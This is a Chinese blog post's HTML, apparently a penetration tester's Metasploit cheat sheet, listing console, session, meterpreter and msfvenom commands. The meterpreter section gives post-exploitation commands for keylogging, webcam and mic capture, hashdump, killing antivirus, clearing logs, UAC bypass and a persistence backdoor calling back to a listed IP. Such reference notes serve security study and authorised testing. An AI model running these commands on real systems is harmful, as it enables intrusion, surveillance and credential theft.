@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"m09ic.top","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="介绍metasploit官网 整理自多篇文章,参考链接在文章最后. GUI工具:armitage 商业版有个web界面,但是不觉得命令行界面更cool吗? 类似工具Cobalt Strike msf主要有以下模块.  渗透攻击模块(Exploits)  辅助模块(Aux)  后渗透攻击模块(Post)  攻击载荷模块(Payloads)  空指令模块(Nops)  编码器模块(Encoders">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MetaSploit CheatSheet">
+<meta property="og:url" content="https://m09ic.top/posts/53382/index.html">
+<meta property="og:site_name" content="M09ic&#39;s Blog">
+<meta property="og:description" content="介绍metasploit官网 整理自多篇文章,参考链接在文章最后. GUI工具:armitage 商业版有个web界面,但是不觉得命令行界面更cool吗? 类似工具Cobalt Strike msf主要有以下模块.  渗透攻击模块(Exploits)  辅助模块(Aux)  后渗透攻击模块(Post)  攻击载荷模块(Payloads)  空指令模块(Nops)  编码器模块(Encoders">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2019-05-24T06:42:30.000Z">
+<meta property="article:modified_time" content="2021-01-04T14:52:24.302Z">
+<meta property="article:author" content="M09ic">
+<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="速查表">
+<meta property="article:tag" content="工具">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://m09ic.top/posts/53382/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>MetaSploit CheatSheet | M09ic's Blog</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-140303637-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-140303637-1');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?04d80448a6c7bfee29f2e7379ff56865";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="M09ic's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">M09ic's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">独自行走于莽荒之地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://m09ic.top/posts/53382/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="M09ic">
+      <meta itemprop="description" content="网络安全,编程学习记录的破地方">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M09ic's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MetaSploit CheatSheet
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-05-24 14:42:30" itemprop="dateCreated datePublished" datetime="2019-05-24T14:42:30+08:00">2019-05-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-01-04 22:52:24" itemprop="dateModified" datetime="2021-01-04T22:52:24+08:00">2021-01-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/posts/53382/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/posts/53382/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <a id="more"></a>
+
+<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><a target="_blank" rel="noopener" href="https://www.metasploit.com/">metasploit官网</a></p>
+<p>整理自多篇文章,参考链接在文章最后.</p>
+<p>GUI工具:<code>armitage</code></p>
+<p>商业版有个web界面,但是不觉得命令行界面更cool吗?</p>
+<p>类似工具<a target="_blank" rel="noopener" href="https://www.cobaltstrike.com/">Cobalt Strike</a></p>
+<p>msf主要有以下模块.</p>
+<ul>
+<li><p>渗透攻击模块(Exploits)</p>
+</li>
+<li><p>辅助模块(Aux)</p>
+</li>
+<li><p>后渗透攻击模块(Post)</p>
+</li>
+<li><p>攻击载荷模块(Payloads)</p>
+</li>
+<li><p>空指令模块(Nops)</p>
+</li>
+<li><p>编码器模块(Encoders)</p>
+<h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用前需要打开postgres数据库</span></span><br><span class="line">service postgresql start</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开msf 控制台终端</span></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 初始化数据库</span></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重新初始化数据库</span></span><br><span class="line">msfdb reinit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看数据库连接情况</span></span><br><span class="line">db_status</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 建立数据库缓存</span></span><br><span class="line">db_rebuild_cache</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看帮助文档</span></span><br><span class="line">help</span><br></pre></td></tr></table></figure>
+<h3 id="渗透阶段"><a href="#渗透阶段" class="headerlink" title="渗透阶段"></a>渗透阶段</h3><p>其实就是挑选一个模块,然后傻瓜式操作</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">show exploits			# 查看所有可用的渗透攻击程序代码 </span><br><span class="line"></span><br><span class="line">show auxiliary			# 查看所有可用的辅助攻击工具 </span><br><span class="line"></span><br><span class="line">search [args]			# 查找需要的模块</span><br><span class="line"></span><br><span class="line">info [args]				# 查看模块信息</span><br><span class="line"></span><br><span class="line">use [args]				# 进入所选模块</span><br><span class="line"></span><br><span class="line">show payloads			# 查看该模块适用的所有载荷代码 </span><br><span class="line"></span><br><span class="line">show targets			# 查看该模块适用的攻击目标类型</span><br><span class="line"></span><br><span class="line">show options			# 查看所有可用选项</span><br><span class="line"></span><br><span class="line">show advanced			# 查看高级参数</span><br><span class="line"></span><br><span class="line">set [args]				# 设置某个option参数</span><br><span class="line"></span><br><span class="line">save					# 将当期配置保存</span><br><span class="line"></span><br><span class="line">run						# 运行模块</span><br><span class="line"></span><br><span class="line">back					# 回退</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="options"><a href="#options" class="headerlink" title="options"></a>options</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 简单介绍基本参数</span></span><br><span class="line">LHOST			# 获取shell的本地ip</span><br><span class="line"></span><br><span class="line">LPORT			# 获取shell的本机端口</span><br><span class="line"></span><br><span class="line">RHOST			# 攻击目标的ip</span><br><span class="line"></span><br><span class="line">LPORT			# 攻击目标的端口</span><br><span class="line"></span><br><span class="line">PAYLOAD			# 指定payload</span><br><span class="line"></span><br><span class="line">TARGET			# 指定目标主机类型</span><br></pre></td></tr></table></figure>
+<h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><p>获取一个普通的shell 用nc就可以,但是要获取meterpreter就需要用到handle模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/mulit/handler</span><br><span class="line">set payload [PAYLOAD]</span><br><span class="line">set lhost [LHOST]</span><br><span class="line">set lport [LPORT]</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h3><p>根据执行方式区分.payload分为:</p>
+<ul>
+<li>Singles - Singles非常小，旨在建立某种通讯，然后进入下一阶段。 例如，只是创建一个用户。</li>
+<li>Staged - 是一种攻击者用来将更大的文件上传到沦陷的系统的payload。</li>
+<li>Stages - Stages是由Stagers模块下载的payload组件。 各种payload stages提供高级功能，没有规模限制，如Meterpreter和VNC Injection。</li>
+</ul>
+<p>根据连接方式区分,payload分为:</p>
+<ul>
+<li>bind - 在靶机上开放一个端口供攻击机连入</li>
+<li>reverse - 在本机上监听一个端口,靶机主动连接</li>
+</ul>
+<p>根据功能区分,payload分为:</p>
+<ul>
+<li><p>shell  -  功能与系统的shell一样</p>
+</li>
+<li><p>meterpreter  -  集成了很多强大的实用功能</p>
+</li>
+<li><p>vnc injection  -  在目标上打开一个vnc,目标主机需安装vnc服务</p>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2></li>
+</ul>
+<h3 id="session-管理"><a href="#session-管理" class="headerlink" title="session 管理"></a>session 管理</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">seesions -l 			# 列出可用的session</span><br><span class="line"></span><br><span class="line">sessions -d 			# 列出所有不活跃的session</span><br><span class="line"></span><br><span class="line">sessions -i	[sessionId]	# 指定一个session</span><br><span class="line"></span><br><span class="line">sessions -v				# 列出详细信息</span><br><span class="line"></span><br><span class="line">sessions -c	[command]	# 指定一条命令,通过-i指定session</span><br><span class="line"></span><br><span class="line">sessions -s [script]	# 在session中运行一个脚本,通过-i指定session</span><br><span class="line"></span><br><span class="line">sessions -u	[sessionId]	# 将一个shell升级为metasploit shell</span><br><span class="line"></span><br><span class="line">sessions -k	[sessionId]	# 杀死一个session</span><br><span class="line"></span><br><span class="line">sessions -K				# 杀死所有session</span><br></pre></td></tr></table></figure>
+<h3 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 基本命令</span></span><br><span class="line">background			# 让meterpreter处于后台模式</span><br><span class="line"></span><br><span class="line">quit				# 退出session</span><br><span class="line"></span><br><span class="line">shell				# 获取shell权限</span><br><span class="line"></span><br><span class="line">irb					# 开启ruby终端</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件系统命令</span></span><br><span class="line">getwd 				# 查看当前工作目录  </span><br><span class="line"></span><br><span class="line">upload 				 # 上传文件到目标机上  </span><br><span class="line"></span><br><span class="line">download 			# 下载文件到本机上  </span><br><span class="line"></span><br><span class="line">edit 				# 编辑文件  </span><br><span class="line"></span><br><span class="line">search  			# 搜索文件</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 网络命令</span> </span><br><span class="line">ipconfig | ifconfig # 查看网络接口信息  </span><br><span class="line"></span><br><span class="line">arp					# 查看arp表</span><br><span class="line"></span><br><span class="line">route				# 查看路由</span><br><span class="line"></span><br><span class="line">getproxy			# 获取代理</span><br><span class="line"></span><br><span class="line">portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发，本机监听4444，把目标机3389转到本机4444 </span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line">route 				# 获取路由表信息</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 系统命令</span></span><br><span class="line">ps 							# 查看当前活跃进程 </span><br><span class="line"></span><br><span class="line">migrate [pid] 				# 将Meterpreter会话移植到进程数位pid的进程中 </span><br><span class="line"></span><br><span class="line">execute -H -i -f cmd.exe 	# 创建新进程cmd.exe，-H不可见，-i交互 </span><br><span class="line"></span><br><span class="line">getpid 						# 获取当前进程的pid </span><br><span class="line"></span><br><span class="line">kill [pid] 					# 杀死进程 </span><br><span class="line"></span><br><span class="line">getuid 						# 查看权限 </span><br><span class="line"></span><br><span class="line">sysinfo 					# 查看目标机系统信息，如机器名，操作系统等 </span><br><span class="line"></span><br><span class="line">shutdown					# 关机</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 实用功能</span></span><br><span class="line">enumdesktops				# 用户登录数</span><br><span class="line"></span><br><span class="line">keyscan_dump				# 键盘记录－下载</span><br><span class="line"></span><br><span class="line">keyscan_start				# 键盘记录　－　开始</span><br><span class="line"></span><br><span class="line">keyscan_stop				# 键盘记录　－　停止</span><br><span class="line"></span><br><span class="line">uictl						# 获取键盘鼠标控制权</span><br><span class="line"></span><br><span class="line">record_mic					# 音频录制</span><br><span class="line"></span><br><span class="line">webcam_chat					# 查看摄像头接口</span><br><span class="line"></span><br><span class="line">webcam_list					# 查看摄像头列表</span><br><span class="line"></span><br><span class="line">webcam_stream				# 摄像头视频获取</span><br><span class="line"></span><br><span class="line">getsystem					# 获取高权限</span><br><span class="line"></span><br><span class="line">hashdump					# 下载账户hash</span><br><span class="line"></span><br><span class="line">migrate						# 将自身注入到其他进程中</span><br><span class="line"></span><br><span class="line">clearev						# 清除痕迹</span><br><span class="line"></span><br><span class="line">screenshot					# 截屏</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> run</span></span><br><span class="line">run [scriptName|moudleName]				# 执行某个模块或脚本	</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 常用模块</span></span><br><span class="line">run  persistence						# persistence 向目标主机注入后门程序</span><br><span class="line"><span class="meta">#</span><span class="bash"> run  persistence -X  -i  5  -p 4444  -r 172.17.11.18</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> -X 在目标主机上开机自启动</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -i 不断尝试反向连接的时间间隔</span></span><br><span class="line"></span><br><span class="line">run metsvc 								# metsvc 注册服务</span><br><span class="line"></span><br><span class="line">run packetrecorder						# 查看网络流量,-i 指定网卡</span><br><span class="line"></span><br><span class="line">run get_local_subnets					# 获得本地网段</span><br><span class="line"></span><br><span class="line">run getcountermeasure					# 显示HIPS和AV进程的列表，显示远程机器的防火墙规则，列出DEP和UAC策略</span><br><span class="line"></span><br><span class="line">run scraper								# 获取网络共享信息</span><br><span class="line"></span><br><span class="line">run killav								# 中止杀毒软件进程</span><br><span class="line"></span><br><span class="line">run vnc									# 获得vnc远程桌面</span><br><span class="line"></span><br><span class="line">run getgui  -e 							# 开启远程桌面 </span><br><span class="line"></span><br><span class="line">run getgui -u example_username -p example_password # 添加账号</span><br><span class="line"><span class="meta">#</span><span class="bash"> 完整脚本列表在kali: /usr/share/metasploit-framework/scripts/meterpreter</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 常用模块</span></span><br><span class="line">post/windows/gather/forensics/enum_drives	# 枚举存储器信息</span><br><span class="line"></span><br><span class="line">post/windows/gather/checkvm					# 检查是否是虚拟机</span><br><span class="line"></span><br><span class="line">post/windows/gather/enum_applications		# 获取目标主机上的软件安装信息</span><br><span class="line"></span><br><span class="line">post/windows/gather/dumplinks				# 获取目标主机上最近访问过的文档、链接信息</span><br><span class="line"></span><br><span class="line">post/windows/gather/enum_ie					# 读取目标主机IE浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码</span><br><span class="line"></span><br><span class="line">post/windows/manage/killav 					# 关闭杀毒软件,可能导致蓝屏</span><br><span class="line"></span><br><span class="line">post/windows/escalate/bypassuac				# 绕过uac</span><br><span class="line"></span><br><span class="line">post/windows/gather/hashdump				# 获取系统hash</span><br><span class="line"></span><br><span class="line">post/windows/manage/enable_rdp				# 开启远程桌面</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>msfvenom是msfpayload,msfencode的结合体,它的优点是单一,命令行,和效率.利用msfvenom可以生成木马程序</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">msfvenom命令行选项</span></span><br><span class="line">-p, --payload [payload]       	# 指定需要使用的payload(攻击荷载)</span><br><span class="line"></span><br><span class="line">-l, --list [module_type]		# 列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line"></span><br><span class="line">-n, --nopsled [length]        	# 为payload预先指定一个NOP滑动长度</span><br><span class="line"></span><br><span class="line">-f, --format [format]        	# 指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line"></span><br><span class="line">-e, --encoder [encoder]       	# 指定需要使用的encoder（编码器）</span><br><span class="line"></span><br><span class="line">-a, --arch [architecture]  		# 指定payload的目标架构</span><br><span class="line"></span><br><span class="line">--platform   [platform]    		# 指定payload的目标平台</span><br><span class="line"></span><br><span class="line">-s, --space [length]        	# 设定有效攻击荷载的最大长度</span><br><span class="line"></span><br><span class="line">-b, --bad-chars [list]          # 设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line"></span><br><span class="line">-i, --iterations [count]        # 指定payload的编码次数</span><br><span class="line"></span><br><span class="line">-c, --add-code [path]          	# 指定一个附加的win32 shellcode文件</span><br><span class="line"></span><br><span class="line">-x, --template [path]          	# 指定一个自定义的可执行文件作为模板</span><br><span class="line"></span><br><span class="line">-k, --keep                      # 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line"></span><br><span class="line">--payload-options            	# 列举payload的标准选项</span><br><span class="line"></span><br><span class="line">-o, --out [path]               	# 保存payload</span><br><span class="line"></span><br><span class="line">-v, --var-name [name]           # 指定一个自定义的变量，以确定输出格式</span><br><span class="line"></span><br><span class="line">--shellest                  	# 最小化生成payload</span><br><span class="line"></span><br><span class="line">-h, --help                      # 查看帮助选项</span><br><span class="line"></span><br><span class="line">--help-formats               	# 查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3007">metasploit基础教程</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/wiki">metasploit wiki</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/29/">后渗透阶段的meterpreter</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34450601/article/details/80207959">meterpreter命令小结</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/9484949.html">Meterpreter命令详解</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>M09ic
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://m09ic.top/posts/53382/" title="MetaSploit CheatSheet">https://m09ic.top/posts/53382/</a>
+  </li>
+  <li class="post-copyright-license">
